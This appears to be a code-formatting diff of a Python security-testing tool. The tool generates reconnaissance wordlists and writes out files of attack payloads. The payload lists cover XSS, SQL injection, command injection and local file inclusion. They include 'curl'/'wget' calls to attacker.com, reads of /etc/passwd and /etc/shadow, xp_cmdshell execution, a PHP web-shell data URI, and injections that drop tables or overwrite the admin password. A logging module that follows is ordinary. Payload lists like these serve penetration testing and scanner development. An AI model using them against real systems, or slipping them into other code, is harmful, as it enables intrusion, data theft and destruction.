 \"api/import\",\n+            \"api/backup\",\n+            \"api/restore\",\n             # Authentication\n-            'oauth', 'oauth2', 'token', 'jwt', 'saml', 'sso',\n-            'api/token', 'api/refresh', 'api/logout', 'api/register',\n-            \n+            \"oauth\",\n+            \"oauth2\",\n+            \"token\",\n+            \"jwt\",\n+            \"saml\",\n+            \"sso\",\n+            \"api/token\",\n+            \"api/refresh\",\n+            \"api/logout\",\n+            \"api/register\",\n             # File operations\n-            'api/upload', 'api/download', 'api/file', 'api/files',\n-            'api/image', 'api/images', 'api/media', 'api/static',\n-            \n+            \"api/upload\",\n+            \"api/download\",\n+            \"api/file\",\n+            \"api/files\",\n+            \"api/image\",\n+            \"api/images\",\n+            \"api/media\",\n+            \"api/static\",\n             # Database operations\n-            'api/db', 'api/database', 'api/sql', 'api/query',\n-            'api/transaction', 'api/commit', 'api/rollback',\n-            \n+            \"api/db\",\n+            \"api/database\",\n+            \"api/sql\",\n+            \"api/query\",\n+            \"api/transaction\",\n+            \"api/commit\",\n+            \"api/rollback\",\n             # System operations\n-            'api/system', 'api/server', 'api/process', 'api/service',\n-            'api/restart', 'api/shutdown', 'api/reboot', 'api/logs'\n+            \"api/system\",\n+            \"api/server\",\n+            \"api/process\",\n+            \"api/service\",\n+            \"api/restart\",\n+            \"api/shutdown\",\n+            \"api/reboot\",\n+            \"api/logs\",\n         ]\n-        \n+\n         # Add versioned endpoints\n-        versions = ['v1', 'v2', 'v3', 'v4', 'v5', '1.0', '2.0', '3.0']\n+        versions = [\"v1\", \"v2\", \"v3\", \"v4\", \"v5\", \"1.0\", \"2.0\", \"3.0\"]\n         versioned_paths = []\n         for version in versions:\n-            versioned_paths.extend([f'api/{version}/{path.split(\"/\")[-1]}' for path in api_paths if not path.startswith('api/')])\n-        \n+            versioned_paths.extend(\n+                [\n+                    f'api/{version}/{path.split(\"/\")[-1]}'\n+                    for path in api_paths\n+                    if not path.startswith(\"api/\")\n+                ]\n+            )\n+\n         return api_paths + versioned_paths\n-    \n+\n     def generate_security_wordlists(self) -> Dict[str, List[str]]:\n         \"\"\"Generate security-focused wordlists\"\"\"\n         security_wordlists = {\n-            'admin_panels': [\n-                'admin', 'administrator', 'administration', 'adminpanel',\n-                'admin-panel', 'admin_panel', 'control', 'controlpanel',\n-                'cp', 'cpanel', 'dashboard', 'panel', 'manager',\n-                'management', 'console', 'backend', 'backoffice',\n-                'operator', 'moderator', 'supervisor', 'root',\n-                'sysadmin', 'webadmin', 'admins', 'admin-console',\n-                'admin-interface', 'admin-area', 'admin-zone'\n-            ],\n-            'login_pages': [\n-                'login', 'signin', 'log-in', 'sign-in', 'logon',\n-                'log-on', 'auth', 'authenticate', 'authorization',\n-                'session', 'access', 'enter', 'portal', 'gateway',\n-                'secure', 'private', 'restricted', 'members',\n-                'users', 'user', 'account', 'accounts', 'profile'\n-            ],\n-            'config_files': [\n-                'config', 'configuration', 'settings', 'options',\n-                'preferences', 'conf', 'cfg', 'ini', 'properties',\n-                'yaml', 'yml', 'json', 'xml', 'toml', 'env',\n-                '.env', '.env.local', '.env.production', '.env.development',\n-                'web.config', 'app.config', 'machine.config',\n-                'httpd.conf', 'apache.conf', 'nginx.conf'\n-            ],\n-            'backup_files': [\n-                'backup', 'backups', 'bak', 'old', 'copy', 'orig',\n-                'original', 'save', 'saved', 'archive', 'archives',\n-                'temp', 'tmp', 'cache', 'log', 'logs', 'history',\n-                'dump', 'dumps', 'export', 'exports', 'data'\n-            ],\n-            'test_files': [\n-                'test', 'tests', 'testing', 'debug', 'dev',\n-                'development', 'staging', 'demo', 'sample',\n-                'example', 'temp', 'temporary', 'trial',\n-                'beta', 'alpha', 'prototype', 'poc', 'proof'\n-            ]\n+            \"admin_panels\": [\n+                \"admin\",\n+                \"administrator\",\n+                \"administration\",\n+                \"adminpanel\",\n+                \"admin-panel\",\n+                \"admin_panel\",\n+                \"control\",\n+                \"controlpanel\",\n+                \"cp\",\n+                \"cpanel\",\n+                \"dashboard\",\n+                \"panel\",\n+                \"manager\",\n+                \"management\",\n+                \"console\",\n+                \"backend\",\n+                \"backoffice\",\n+                \"operator\",\n+                \"moderator\",\n+                \"supervisor\",\n+                \"root\",\n+                \"sysadmin\",\n+                \"webadmin\",\n+                \"admins\",\n+                \"admin-console\",\n+                \"admin-interface\",\n+                \"admin-area\",\n+                \"admin-zone\",\n+            ],\n+            \"login_pages\": [\n+                \"login\",\n+                \"signin\",\n+                \"log-in\",\n+                \"sign-in\",\n+                \"logon\",\n+                \"log-on\",\n+                \"auth\",\n+                \"authenticate\",\n+                \"authorization\",\n+                \"session\",\n+                \"access\",\n+                \"enter\",\n+                \"portal\",\n+                \"gateway\",\n+                \"secure\",\n+                \"private\",\n+                \"restricted\",\n+                \"members\",\n+                \"users\",\n+                \"user\",\n+                \"account\",\n+                \"accounts\",\n+                \"profile\",\n+            ],\n+            \"config_files\": [\n+                \"config\",\n+                \"configuration\",\n+                \"settings\",\n+                \"options\",\n+                \"preferences\",\n+                \"conf\",\n+                \"cfg\",\n+                \"ini\",\n+                \"properties\",\n+                \"yaml\",\n+                \"yml\",\n+                \"json\",\n+                \"xml\",\n+                \"toml\",\n+                \"env\",\n+                \".env\",\n+                \".env.local\",\n+                \".env.production\",\n+                \".env.development\",\n+                \"web.config\",\n+                \"app.config\",\n+                \"machine.config\",\n+                \"httpd.conf\",\n+                \"apache.conf\",\n+                \"nginx.conf\",\n+            ],\n+            \"backup_files\": [\n+                \"backup\",\n+                \"backups\",\n+                \"bak\",\n+                \"old\",\n+                \"copy\",\n+                \"orig\",\n+                \"original\",\n+                \"save\",\n+                \"saved\",\n+                \"archive\",\n+                \"archives\",\n+                \"temp\",\n+                \"tmp\",\n+                \"cache\",\n+                \"log\",\n+                \"logs\",\n+                \"history\",\n+                \"dump\",\n+                \"dumps\",\n+                \"export\",\n+                \"exports\",\n+                \"data\",\n+            ],\n+            \"test_files\": [\n+                \"test\",\n+                \"tests\",\n+                \"testing\",\n+                \"debug\",\n+                \"dev\",\n+                \"development\",\n+                \"staging\",\n+                \"demo\",\n+                \"sample\",\n+                \"example\",\n+                \"temp\",\n+                \"temporary\",\n+                \"trial\",\n+                \"beta\",\n+                \"alpha\",\n+                \"prototype\",\n+                \"poc\",\n+                \"proof\",\n+            ],\n         }\n-        \n+\n         return security_wordlists\n+\n \n class EnhancedPayloadGenerator:\n     \"\"\"Generate comprehensive payloads for vulnerability testing\"\"\"\n-    \n+\n     def __init__(self):\n         self.payloads_dir = PAYLOADS_DIR\n         self.payloads_dir.mkdir(exist_ok=True)\n-    \n+\n     def generate_xss_payloads(self) -> List[str]:\n         \"\"\"Generate comprehensive XSS payloads\"\"\"\n         xss_payloads = [\n             # Basic XSS\n             '<script>alert(\"XSS\")</script>',\n-            '<script>alert(1)</script>',\n+            \"<script>alert(1)</script>\",\n             '<script>confirm(\"XSS\")</script>',\n             '<script>prompt(\"XSS\")</script>',\n-            \n             # Event handlers\n             '<img src=x onerror=alert(\"XSS\")>',\n             '<img src=x onload=alert(\"XSS\")>',\n             '<body onload=alert(\"XSS\")>',\n             '<input onfocus=alert(\"XSS\") autofocus>',\n             '<select onfocus=alert(\"XSS\") autofocus>',\n             '<textarea onfocus=alert(\"XSS\") autofocus>',\n             '<keygen onfocus=alert(\"XSS\") autofocus>',\n             '<video onloadstart=alert(\"XSS\")><source>',\n             '<audio onloadstart=alert(\"XSS\")><source>',\n-            \n             # JavaScript URLs\n             'javascript:alert(\"XSS\")',\n             'javascript:confirm(\"XSS\")',\n             'javascript:prompt(\"XSS\")',\n-            \n             # Data URLs\n             'data:text/html,<script>alert(\"XSS\")</script>',\n-            'data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4=',\n-            \n+            \"data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4=\",\n             # Filter bypasses\n             '<ScRiPt>alert(\"XSS\")</ScRiPt>',\n-            '<script>alert(String.fromCharCode(88,83,83))</script>',\n+            \"<script>alert(String.fromCharCode(88,83,83))</script>\",\n             '<script>eval(atob(\"YWxlcnQoIlhTUyIp\"))</script>',\n-            '<script>setTimeout(\"alert(\\'XSS\\')\",1)</script>',\n-            '<script>setInterval(\"alert(\\'XSS\\')\",1)</script>',\n-            \n+            \"<script>setTimeout(\\\"alert('XSS')\\\",1)</script>\",\n+            \"<script>setInterval(\\\"alert('XSS')\\\",1)</script>\",\n             # Encoding bypasses\n             '%3Cscript%3Ealert(\"XSS\")%3C/script%3E',\n             '&lt;script&gt;alert(\"XSS\")&lt;/script&gt;',\n             '&#60;script&#62;alert(\"XSS\")&#60;/script&#62;',\n             '&#x3C;script&#x3E;alert(\"XSS\")&#x3C;/script&#x3E;',\n-            \n             # CSS injection\n-            '<style>body{background:url(\"javascript:alert(\\'XSS\\')\")}</style>',\n-            '<style>@import\"javascript:alert(\\'XSS\\')\"</style>',\n-            '<style>body{-moz-binding:url(\"javascript:alert(\\'XSS\\')\")}</style>',\n-            \n+            \"<style>body{background:url(\\\"javascript:alert('XSS')\\\")}</style>\",\n+            \"<style>@import\\\"javascript:alert('XSS')\\\"</style>\",\n+            \"<style>body{-moz-binding:url(\\\"javascript:alert('XSS')\\\")}</style>\",\n             # SVG payloads\n             '<svg onload=alert(\"XSS\")>',\n             '<svg><script>alert(\"XSS\")</script></svg>',\n             '<svg><foreignObject><script>alert(\"XSS\")</script></foreignObject></svg>',\n-            \n             # DOM-based\n-            '<iframe src=\"javascript:alert(\\'XSS\\')\"></iframe>',\n-            '<object data=\"javascript:alert(\\'XSS\\')\"></object>',\n-            '<embed src=\"javascript:alert(\\'XSS\\')\"></embed>',\n-            \n+            \"<iframe src=\\\"javascript:alert('XSS')\\\"></iframe>\",\n+            \"<object data=\\\"javascript:alert('XSS')\\\"></object>\",\n+            \"<embed src=\\\"javascript:alert('XSS')\\\"></embed>\",\n             # Modern bypasses\n             '<details open ontoggle=alert(\"XSS\")>',\n             '<marquee onstart=alert(\"XSS\")>',\n             '<meter onmouseenter=alert(\"XSS\")>',\n             '<progress onmouseenter=alert(\"XSS\")>',\n         ]\n-        \n+\n         return xss_payloads\n-    \n+\n     def generate_sqli_payloads(self) -> List[str]:\n         \"\"\"Generate comprehensive SQL injection payloads\"\"\"\n         sqli_payloads = [\n             # Basic injection\n-            \"'\", \"''\", '\"', '\"\"', \"1'\", '1\"',\n-            \"1' OR '1'='1\", '1\" OR \"1\"=\"1',\n-            \"admin'--\", 'admin\"--', \"admin'#\", 'admin\"#',\n-            \n+            \"'\",\n+            \"''\",\n+            '\"',\n+            '\"\"',\n+            \"1'\",\n+            '1\"',\n+            \"1' OR '1'='1\",\n+            '1\" OR \"1\"=\"1',\n+            \"admin'--\",\n+            'admin\"--',\n+            \"admin'#\",\n+            'admin\"#',\n             # Union-based\n             \"' UNION SELECT NULL--\",\n             \"' UNION SELECT NULL,NULL--\",\n             \"' UNION SELECT NULL,NULL,NULL--\",\n             \"' UNION SELECT 1,2,3--\",\n             \"' UNION SELECT user(),database(),version()--\",\n             \"' UNION SELECT table_name FROM information_schema.tables--\",\n             \"' UNION SELECT column_name FROM information_schema.columns--\",\n-            \n             # Boolean-based\n             \"1' AND '1'='1\",\n             \"1' AND '1'='2\",\n             \"1' AND (SELECT COUNT(*) FROM users)>0--\",\n             \"1' AND (SELECT SUBSTRING(user(),1,1))='r'--\",\n             \"1' AND ASCII(SUBSTRING(user(),1,1))=114--\",\n-            \n             # Time-based\n             \"1'; WAITFOR DELAY '00:00:05'--\",\n             \"1' AND SLEEP(5)--\",\n             \"1' AND (SELECT COUNT(*) FROM users WHERE SLEEP(5))--\",\n             \"1'; SELECT pg_sleep(5)--\",\n             \"1' AND BENCHMARK(5000000,MD5(1))--\",\n-            \n             # Error-based\n             \"1' AND EXTRACTVALUE(1,CONCAT(0x7e,user(),0x7e))--\",\n             \"1' AND UPDATEXML(1,CONCAT(0x7e,user(),0x7e),1)--\",\n             \"1' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(user(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--\",\n-            \n             # NoSQL injection\n             \"{'$ne': ''}\",\n             \"{'$gt': ''}\",\n             \"{'$regex': '.*'}\",\n             \"admin'; return true; var x='\",\n-            \n             # Second-order\n             \"admin'; INSERT INTO users VALUES('hacker','password')--\",\n             \"admin'; UPDATE users SET password='hacked' WHERE username='admin'--\",\n             \"admin'; DROP TABLE users--\",\n-            \n             # Blind injection\n             \"1' AND LENGTH(user())=5--\",\n             \"1' AND SUBSTR(user(),1,1)='r'--\",\n             \"1' AND ORD(SUBSTR(user(),1,1))=114--\",\n-            \n             # WAF bypasses\n             \"1'/**/OR/**/1=1--\",\n             \"1'%20OR%201=1--\",\n             \"1'/*!50000OR*/1=1--\",\n             \"1'%0aOR%0a1=1--\",\n             \"1'||'1'='1\",\n-            \n             # Database-specific\n             # MySQL\n             \"1' AND ROW(1,1)>(SELECT COUNT(*),CONCAT(user(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x LIMIT 1)--\",\n             # PostgreSQL\n             \"1'; SELECT version()--\",\n             # MSSQL\n             \"1'; EXEC xp_cmdshell('whoami')--\",\n             # Oracle\n             \"1' AND (SELECT user FROM dual)='SCOTT'--\",\n         ]\n-        \n+\n         return sqli_payloads\n-    \n+\n     def generate_command_injection_payloads(self) -> List[str]:\n         \"\"\"Generate command injection payloads\"\"\"\n         cmd_payloads = [\n             # Basic command injection\n             \"; whoami\",\n@@ -372,56 +689,50 @@\n             \"&& whoami\",\n             \"|| whoami\",\n             \"`whoami`\",\n             \"$(whoami)\",\n             \"${whoami}\",\n-            \n             # Directory traversal\n             \"; ls\",\n             \"| ls\",\n             \"; dir\",\n             \"| dir\",\n             \"; cat /etc/passwd\",\n             \"| cat /etc/passwd\",\n             \"; type C:\\\\Windows\\\\System32\\\\drivers\\\\etc\\\\hosts\",\n-            \n             # Network commands\n             \"; ping -c 1 google.com\",\n             \"| ping -c 1 google.com\",\n             \"; nslookup google.com\",\n             \"| nslookup google.com\",\n             \"; curl http://attacker.com\",\n             \"| wget http://attacker.com\",\n-            \n             # System information\n             \"; uname -a\",\n             \"| uname -a\",\n             \"; systeminfo\",\n             \"| systeminfo\",\n             \"; env\",\n             \"| env\",\n             \"; set\",\n             \"| set\",\n-            \n             # Time-based detection\n             \"; sleep 5\",\n             \"| sleep 5\",\n             \"; ping -c 5 127.0.0.1\",\n             \"| ping -n 5 127.0.0.1\",\n-            \n             # Encoded payloads\n             urllib.parse.quote(\"; whoami\"),\n             urllib.parse.quote(\"| whoami\"),\n             base64.b64encode(b\"; whoami\").decode(),\n-            \n             # PowerShell\n             \"; powershell.exe -Command whoami\",\n             \"| powershell.exe -EncodedCommand dwBoAG8AYQBtAGkA\",\n         ]\n-        \n+\n         return cmd_payloads\n-    \n+\n     def generate_lfi_payloads(self) -> List[str]:\n         \"\"\"Generate Local File Inclusion payloads\"\"\"\n         lfi_payloads = [\n             # Basic LFI\n             \"../etc/passwd\",\n@@ -430,237 +741,235 @@\n             \"../../../../etc/passwd\",\n             \"../../../../../etc/passwd\",\n             \"../../../../../../etc/passwd\",\n             \"../../../../../../../etc/passwd\",\n             \"../../../../../../../../etc/passwd\",\n-            \n             # Windows\n             \"..\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts\",\n             \"..\\\\..\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts\",\n             \"..\\\\..\\\\..\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts\",\n             \"C:\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts\",\n             \"C:\\\\boot.ini\",\n             \"C:\\\\windows\\\\win.ini\",\n-            \n             # Null byte injection\n             \"../etc/passwd%00\",\n             \"../etc/passwd%00.txt\",\n             \"../etc/passwd\\x00\",\n-            \n             # URL encoding\n             \"%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64\",\n             \"%2e%2e/%65%74%63/%70%61%73%73%77%64\",\n             \"..%2f..%2f..%2fetc%2fpasswd\",\n-            \n             # Double encoding\n             \"%252e%252e%252f%65%74%63%252f%70%61%73%73%77%64\",\n-            \n             # PHP wrappers\n             \"php://filter/read=convert.base64-encode/resource=index.php\",\n             \"php://filter/convert.base64-encode/resource=config.php\",\n             \"data://text/plain,<?php system($_GET['cmd']); ?>\",\n             \"data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+\",\n-            \n             # Log poisoning\n             \"/var/log/apache2/access.log\",\n             \"/var/log/apache2/error.log\",\n             \"/var/log/nginx/access.log\",\n             \"/var/log/nginx/error.log\",\n             \"/proc/self/environ\",\n             \"/proc/self/fd/0\",\n             \"/proc/self/fd/1\",\n             \"/proc/self/fd/2\",\n-            \n             # Common files\n             \"/etc/shadow\",\n             \"/etc/hosts\",\n             \"/etc/hostname\",\n             \"/etc/resolv.conf\",\n             \"/proc/version\",\n             \"/proc/cmdline\",\n             \"/proc/meminfo\",\n             \"/proc/cpuinfo\",\n         ]\n-        \n+\n         return lfi_payloads\n-    \n+\n     def save_all_wordlists_and_payloads(self):\n         \"\"\"Save all generated wordlists and payloads to files\"\"\"\n         print(\"\ud83d\udd27 Generating enhanced wordlists and payloads...\")\n-        \n+\n         # Initialize the payload generator\n         payload_generator = EnhancedPayloadGenerator()\n-        \n+\n         # Technology-specific wordlists\n         tech_wordlists = self.generate_technology_specific_wordlists()\n         for tech, wordlist in tech_wordlists.items():\n             file_path = self.wordlists_dir / f\"technology_{tech}.txt\"\n-            with open(file_path, 'w') as f:\n-                f.write('\\n'.join(wordlist))\n+            with open(file_path, \"w\") as f:\n+                f.write(\"\\n\".join(wordlist))\n             print(f\"\u2705 Created: {file_path} ({len(wordlist)} entries)\")\n-        \n+\n         # Cloud-specific wordlists\n         cloud_wordlists = self.generate_cloud_specific_wordlists()\n         for cloud, wordlist in cloud_wordlists.items():\n             file_path = self.wordlists_dir / f\"cloud_{cloud}.txt\"\n-            with open(file_path, 'w') as f:\n-                f.write('\\n'.join(wordlist))\n+            with open(file_path, \"w\") as f:\n+                f.write(\"\\n\".join(wordlist))\n             print(f\"\u2705 Created: {file_path} ({len(wordlist)} entries)\")\n-        \n+\n         # API wordlists\n         api_wordlist = self.generate_api_wordlists()\n         api_file = self.wordlists_dir / \"api_endpoints.txt\"\n-        with open(api_file, 'w') as f:\n-            f.write('\\n'.join(api_wordlist))\n+        with open(api_file, \"w\") as f:\n+            f.write(\"\\n\".join(api_wordlist))\n         print(f\"\u2705 Created: {api_file} ({len(api_wordlist)} entries)\")\n-        \n+\n         # Security wordlists\n         security_wordlists = self.generate_security_wordlists()\n         for category, wordlist in security_wordlists.items():\n             file_path = self.wordlists_dir / f\"security_{category}.txt\"\n-            with open(file_path, 'w') as f:\n-                f.write('\\n'.join(wordlist))\n+            with open(file_path, \"w\") as f:\n+                f.write(\"\\n\".join(wordlist))\n             print(f\"\u2705 Created: {file_path} ({len(wordlist)} entries)\")\n-        \n+\n         # XSS payloads\n         xss_payloads = payload_generator.generate_xss_payloads()\n         xss_file = self.payloads_dir / \"xss_payloads.txt\"\n-        with open(xss_file, 'w') as f:\n-            f.write('\\n'.join(xss_payloads))\n+        with open(xss_file, \"w\") as f:\n+            f.write(\"\\n\".join(xss_payloads))\n         print(f\"\u2705 Created: {xss_file} ({len(xss_payloads)} entries)\")\n-        \n+\n         # SQL injection payloads\n         sqli_payloads = payload_generator.generate_sqli_payloads()\n         sqli_file = self.payloads_dir / \"sqli_payloads.txt\"\n-        with open(sqli_file, 'w') as f:\n-            f.write('\\n'.join(sqli_payloads))\n+        with open(sqli_file, \"w\") as f:\n+            f.write(\"\\n\".join(sqli_payloads))\n         print(f\"\u2705 Created: {sqli_file} ({len(sqli_payloads)} entries)\")\n-        \n+\n         # Command injection payloads\n         cmd_payloads = payload_generator.generate_command_injection_payloads()\n         cmd_file = self.payloads_dir / \"command_injection_payloads.txt\"\n-        with open(cmd_file, 'w') as f:\n-            f.write('\\n'.join(cmd_payloads))\n+        with open(cmd_file, \"w\") as f:\n+            f.write(\"\\n\".join(cmd_payloads))\n         print(f\"\u2705 Created: {cmd_file} ({len(cmd_payloads)} entries)\")\n-        \n+\n         # LFI payloads\n         lfi_payloads = payload_generator.generate_lfi_payloads()\n         lfi_file = self.payloads_dir / \"lfi_payloads.txt\"\n-        with open(lfi_file, 'w') as f:\n-            f.write('\\n'.join(lfi_payloads))\n+        with open(lfi_file, \"w\") as f:\n+            f.write(\"\\n\".join(lfi_payloads))\n         print(f\"\u2705 Created: {lfi_file} ({len(lfi_payloads)} entries)\")\n-        \n+\n         # Comprehensive payloads JSON\n         all_payloads = {\n             \"xss\": xss_payloads,\n             \"sqli\": sqli_payloads,\n             \"command_injection\": cmd_payloads,\n             \"lfi\": lfi_payloads,\n             \"technology_wordlists\": tech_wordlists,\n             \"cloud_wordlists\": cloud_wordlists,\n             \"api_endpoints\": api_wordlist,\n-            \"security_wordlists\": security_wordlists\n+            \"security_wordlists\": security_wordlists,\n         }\n-        \n+\n         comprehensive_file = self.payloads_dir / \"comprehensive_payloads.json\"\n-        with open(comprehensive_file, 'w') as f:\n+        with open(comprehensive_file, \"w\") as f:\n             json.dump(all_payloads, f, indent=2)\n         print(f\"\u2705 Created: {comprehensive_file}\")\n-        \n+\n         print(f\"\\n\ud83c\udfaf Enhanced wordlists and payloads generation complete!\")\n-        print(f\"\ud83d\udcca Total files created: {len(tech_wordlists) + len(cloud_wordlists) + len(security_wordlists) + 6}\")\n+        print(\n+            f\"\ud83d\udcca Total files created: {len(tech_wordlists) + len(cloud_wordlists) + len(security_wordlists) + 6}\"\n+        )\n \n \n def save_all_wordlists_and_payloads():\n     \"\"\"Save all generated wordlists and payloads to files\"\"\"\n     print(\"\ud83d\udd27 Generating enhanced wordlists and payloads...\")\n-    \n+\n     # Initialize generators\n     wordlist_generator = EnhancedWordlistGenerator()\n     payload_generator = EnhancedPayloadGenerator()\n-    \n+\n     # Technology-specific wordlists\n     tech_wordlists = wordlist_generator.generate_technology_specific_wordlists()\n     for tech, wordlist in tech_wordlists.items():\n         file_path = wordlist_generator.wordlists_dir / f\"technology_{tech}.txt\"\n-        with open(file_path, 'w') as f:\n-            f.write('\\n'.join(wordlist))\n+        with open(file_path, \"w\") as f:\n+            f.write(\"\\n\".join(wordlist))\n         print(f\"\u2705 Created: {file_path} ({len(wordlist)} entries)\")\n-    \n+\n     # Cloud-specific wordlists\n     cloud_wordlists = wordlist_generator.generate_cloud_specific_wordlists()\n     for cloud, wordlist in cloud_wordlists.items():\n         file_path = wordlist_generator.wordlists_dir / f\"cloud_{cloud}.txt\"\n-        with open(file_path, 'w') as f:\n-            f.write('\\n'.join(wordlist))\n+        with open(file_path, \"w\") as f:\n+            f.write(\"\\n\".join(wordlist))\n         print(f\"\u2705 Created: {file_path} ({len(wordlist)} entries)\")\n-    \n+\n     # API wordlists\n     api_wordlist = wordlist_generator.generate_api_wordlists()\n     api_file = wordlist_generator.wordlists_dir / \"api_endpoints.txt\"\n-    with open(api_file, 'w') as f:\n-        f.write('\\n'.join(api_wordlist))\n+    with open(api_file, \"w\") as f:\n+        f.write(\"\\n\".join(api_wordlist))\n     print(f\"\u2705 Created: {api_file} ({len(api_wordlist)} entries)\")\n-    \n+\n     # Security wordlists\n     security_wordlists = wordlist_generator.generate_security_wordlists()\n     for category, wordlist in security_wordlists.items():\n         file_path = wordlist_generator.wordlists_dir / f\"security_{category}.txt\"\n-        with open(file_path, 'w') as f:\n-            f.write('\\n'.join(wordlist))\n+        with open(file_path, \"w\") as f:\n+            f.write(\"\\n\".join(wordlist))\n         print(f\"\u2705 Created: {file_path} ({len(wordlist)} entries)\")\n-    \n+\n     # XSS payloads\n     xss_payloads = payload_generator.generate_xss_payloads()\n     xss_file = payload_generator.payloads_dir / \"xss_payloads.txt\"\n-    with open(xss_file, 'w') as f:\n-        f.write('\\n'.join(xss_payloads))\n+    with open(xss_file, \"w\") as f:\n+        f.write(\"\\n\".join(xss_payloads))\n     print(f\"\u2705 Created: {xss_file} ({len(xss_payloads)} entries)\")\n-    \n+\n     # SQL injection payloads\n     sqli_payloads = payload_generator.generate_sqli_payloads()\n     sqli_file = payload_generator.payloads_dir / \"sqli_payloads.txt\"\n-    with open(sqli_file, 'w') as f:\n-        f.write('\\n'.join(sqli_payloads))\n+    with open(sqli_file, \"w\") as f:\n+        f.write(\"\\n\".join(sqli_payloads))\n     print(f\"\u2705 Created: {sqli_file} ({len(sqli_payloads)} entries)\")\n-    \n+\n     # Command injection payloads\n     cmd_payloads = payload_generator.generate_command_injection_payloads()\n     cmd_file = payload_generator.payloads_dir / \"command_injection_payloads.txt\"\n-    with open(cmd_file, 'w') as f:\n-        f.write('\\n'.join(cmd_payloads))\n+    with open(cmd_file, \"w\") as f:\n+        f.write(\"\\n\".join(cmd_payloads))\n     print(f\"\u2705 Created: {cmd_file} ({len(cmd_payloads)} entries)\")\n-    \n+\n     # LFI payloads\n     lfi_payloads = payload_generator.generate_lfi_payloads()\n     lfi_file = payload_generator.payloads_dir / \"lfi_payloads.txt\"\n-    with open(lfi_file, 'w') as f:\n-        f.write('\\n'.join(lfi_payloads))\n+    with open(lfi_file, \"w\") as f:\n+        f.write(\"\\n\".join(lfi_payloads))\n     print(f\"\u2705 Created: {lfi_file} ({len(lfi_payloads)} entries)\")\n-    \n+\n     # Comprehensive payloads JSON\n     all_payloads = {\n         \"xss\": xss_payloads,\n         \"sqli\": sqli_payloads,\n         \"command_injection\": cmd_payloads,\n         \"lfi\": lfi_payloads,\n         \"technology_wordlists\": tech_wordlists,\n         \"cloud_wordlists\": cloud_wordlists,\n         \"api_endpoints\": api_wordlist,\n-        \"security_wordlists\": security_wordlists\n+        \"security_wordlists\": security_wordlists,\n     }\n-    \n+\n     comprehensive_file = payload_generator.payloads_dir / \"comprehensive_payloads.json\"\n-    with open(comprehensive_file, 'w') as f:\n+    with open(comprehensive_file, \"w\") as f:\n         json.dump(all_payloads, f, indent=2)\n     print(f\"\u2705 Created: {comprehensive_file}\")\n-    \n+\n     print(f\"\\n\ud83c\udfaf Enhanced wordlists and payloads generation complete!\")\n-    print(f\"\ud83d\udcca Total files created: {len(tech_wordlists) + len(cloud_wordlists) + len(security_wordlists) + 6}\")\n+    print(\n+        f\"\ud83d\udcca Total files created: {len(tech_wordlists) + len(cloud_wordlists) + len(security_wordlists) + 6}\"\n+    )\n \n \n def main():\n     \"\"\"Main function to generate all wordlists and payloads\"\"\"\n     save_all_wordlists_and_payloads()\n \n+\n if __name__ == \"__main__\":\n-    main()\n\\ No newline at end of file\n+    main()\n--- /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/error_handler.py\t2025-09-14 19:10:58.551754+00:00\n+++ /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/error_handler.py\t2025-09-14 19:23:11.849094+00:00\n@@ -13,321 +13,373 @@\n from typing import Any, Callable, Dict, Optional, TypeVar, Union\n from datetime import datetime\n import json\n \n # Type variable for decorated functions\n-F = TypeVar('F', bound=Callable[..., Any])\n+F = TypeVar(\"F\", bound=Callable[..., Any])\n \n \n class SecurityTestingError(Exception):\n     \"\"\"Base exception for security testing operations\"\"\"\n+\n     pass\n \n \n class ConfigurationError(SecurityTestingError):\n     \"\"\"Configuration-related errors\"\"\"\n+\n     pass\n \n \n class ToolExecutionError(SecurityTestingError):\n     \"\"\"External tool execution errors\"\"\"\n+\n     def __init__(self, tool_name: str, message: str, return_code: Optional[int] = None):\n         self.tool_name = tool_name\n         self.return_code = return_code\n         super().__init__(f\"{tool_name}: {message}\")\n \n \n class NetworkError(SecurityTestingError):\n     \"\"\"Network-related errors\"\"\"\n+\n     pass\n \n \n class ValidationError(SecurityTestingError):\n     \"\"\"Input validation errors\"\"\"\n+\n     pass\n \n \n class EnhancedLogger:\n     \"\"\"Enhanced logger with structured logging and error context\"\"\"\n-    \n+\n     def __init__(self, name: str = \"bl4ckc3ll_pantheon\", log_dir: Path = None):\n         self.name = name\n         self.log_dir = log_dir or Path(\"logs\")\n         self.log_dir.mkdir(exist_ok=True)\n-        \n+\n         # Set up logger\n         self.logger = logging.getLogger(name)\n         self.logger.setLevel(logging.DEBUG)\n-        \n+\n         # Clear existing handlers\n         self.logger.handlers.clear()\n-        \n+\n         # File handler\n         log_file = self.log_dir / f\"{name}.log\"\n         self.log_file = log_file\n         file_handler = logging.FileHandler(log_file)\n         file_handler.setLevel(logging.DEBUG)\n-        \n-        # Console handler  \n+\n+        # Console handler\n         console_handler = logging.StreamHandler()\n         console_handler.setLevel(logging.INFO)\n-        \n+\n         # Formatters\n         detailed_formatter = logging.Formatter(\n-            '%(asctime)s - %(name)s - %(levelname)s - %(message)s'\n+            \"%(asctime)s - %(name)s - %(levelname)s - %(message)s\"\n         )\n-        simple_formatter = logging.Formatter('%(levelname)s: %(message)s')\n-        \n+        simple_formatter = logging.Formatter(\"%(levelname)s: %(message)s\")\n+\n         file_handler.setFormatter(detailed_formatter)\n         console_handler.setFormatter(simple_formatter)\n-        \n+\n         self.logger.addHandler(file_handler)\n         self.logger.addHandler(console_handler)\n-        \n+\n         # Error context tracking\n         self.error_context: Dict[str, Any] = {}\n-    \n+\n     def set_context(self, **kwargs) -> None:\n         \"\"\"Set context information for error reporting\"\"\"\n         self.error_context.update(kwargs)\n-    \n+\n     def clear_context(self) -> None:\n         \"\"\"Clear error context\"\"\"\n         self.error_context.clear()\n-    \n+\n     def log(self, message: str, level: str = \"INFO\", **kwargs) -> None:\n         